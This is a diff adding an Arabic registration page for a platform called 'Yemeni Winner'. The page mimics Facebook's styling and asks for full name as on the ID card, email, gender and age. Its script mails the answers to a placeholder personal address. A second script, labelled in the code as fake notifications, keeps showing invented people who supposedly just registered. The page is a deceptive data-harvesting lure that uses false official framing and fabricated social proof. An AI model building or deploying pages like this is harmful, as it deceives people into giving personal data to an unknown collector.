@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>يمني رابح - التسجيل الرسمي</title>
+    <style>
+        :root { --fb-blue: #1877F2; --fb-bg: #F0F2F5; --fb-white: #ffffff; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: var(--fb-bg); margin: 0; color: #1c1e21; }
+        
+        header { 
+            background-color: var(--fb-white); height: 56px; display: flex; 
+            align-items: center; padding: 0 16px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
+            position: fixed; width: 100%; top: 0; z-index: 100;
+        }
+        .logo { color: var(--fb-blue); font-size: 24px; font-weight: bold; text-decoration: none; }
+        
+        .main-container { margin-top: 70px; display: flex; justify-content: center; padding: 10px; }
+        .registration-card { 
+            background: var(--fb-white); width: 100%; max-width: 450px; 
+            border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 20px;
+        }
+
+        h2 { text-align: center; color: #1c1e21; margin-bottom: 20px; font-size: 20px; }
+        
+        .form-group { margin-bottom: 15px; text-align: right; }
+        .form-group label { display: block; margin-bottom: 5px; font-weight: 600; font-size: 14px; }
+        .form-group input, .form-group select { 
+            width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; 
+            box-sizing: border-box; font-size: 15px; background: #F5F6F7;
+        }
+
+        .terms { font-size: 12px; color: #65676b; margin-top: 10px; display: flex; align-items: flex-start; }
+        .terms input { margin-left: 10px; margin-top: 3px; }
+
+        .btn-submit { 
+            display: block; width: 100%; background: #42b72a; color: white; 
+            text-align: center; padding: 12px; border-radius: 6px; 
+            text-decoration: none; font-weight: bold; border: none; 
+            font-size: 17px; cursor: pointer; margin-top: 20px;
+        }
+        .btn-submit:hover { background: #36a420; }
+
+        #notif-box { 
+            display:none; position: fixed; bottom: 20px; right: 20px; 
+            background: white; border-radius: 10px; padding: 12px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); z-index: 1000; 
+            border-right: 5px solid var(--fb-blue); min-width: 200px;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <a href="#" class="logo">يمني رابح</a>
+</header>
+
+<div class="main-container">
+    <div class="registration-card">
+        <h2>إنشاء حساب جديد في المنصة</h2>
+        
+        <form action="mailto:YOUR_EMAIL@gmail.com" method="GET" enctype="text/plain" onsubmit="return processMailto(this)">
+            
+            <div class="form-group">
+                <label>الاسم الكامل (كما في البطاقة الشخصية)</label>
+                <input type="text" name="الاسم" placeholder="أدخل اسمك الرباعي" required>
+            </div>
+
+            <div class="form-group">
+                <label>البريد الإلكتروني</label>
+                <input type="email" name="الايميل" placeholder="example@mail.com" required>
+            </div>
+
+            <div class="form-group">
+                <label>الجنس</label>
+                <select name="الجنس" required>
+                    <option value="">اختر...</option>
+                    <option value="ذكر">ذكر</option>
+                    <option value="أنثى">أنثى</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>العمر</label>
+                <input type="number" name="العمر" min="18" max="70" placeholder="مثال: 25" required>
+            </div>
+
+            <div class="terms">
+                <input type="checkbox" required>
+                <span>أوافق على شروط وأحكام منصة يمني رابح وسياسة الخصوصية.</span>
+            </div>
+
+            <button type="submit" class="btn-submit">تفعيل الحساب الآن</button>
+        </form>
+    </div>
+</div>
+
+<div id="notif-box">
+    <div style="display: flex; align-items: center;">
+        <div style="width: 30px; height: 30px; background: var(--fb-blue); border-radius: 50%; margin-left: 10px;"></div>
+        <div style="font-size: 12px;">
+            <strong id="notif-user">صالح محمد</strong>
+            <div style="color: #65676b;">أكمل بياناته الشخصية ✅</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // وظيفة تجميع البيانات وإرسالها للإيميل بشكل منظم
+    function processMailto(form) {
+        const email = "YOUR_EMAIL@gmail.com"; // ضع ايميلك هنا
+        const name = form.elements["الاسم"].value;
+        const userEmail = form.elements["الايميل"].value;
+        const gender = form.elements["الجنس"].value;
+        const age = form.elements["العمر"].value;
+
+        const subject = encodeURIComponent("طلب تسجيل عضوية جديدة: " + name);
+        const body = encodeURIComponent(
+            "بيانات العضو الجديد:\n" +
+            "--------------------\n" +
+            "الاسم: " + name + "\n" +
+            "الايميل: " + userEmail + "\n" +
+            "الجنس: " + gender + "\n" +
+            "العمر: " + age + "\n" +
+            "--------------------\n" +
+            "تمت الموافقة على الشروط."
+        );
+
+        window.location.href = `mailto:${email}?subject=${subject}&body=${body}`;
+        return false;
+    }
+
+    // إشعارات وهمية
+    const names = ["علي كمال", "فاطمة أحمد", "حسين العبسي", "مروى محمد", "سامي نجيب"];
+    function showNotification() {
+        const notif = document.getElementById('notif-box');
+        document.getElementById('notif-user').innerText = names[Math.floor(Math.random() * names.length)];
+        notif.style.display = 'block';
+        setTimeout(() => { notif.style.display = 'none'; }, 4000);
+    }
+    setInterval(showNotification, 15000);
+</script>
+
+</body>
+</html>
+
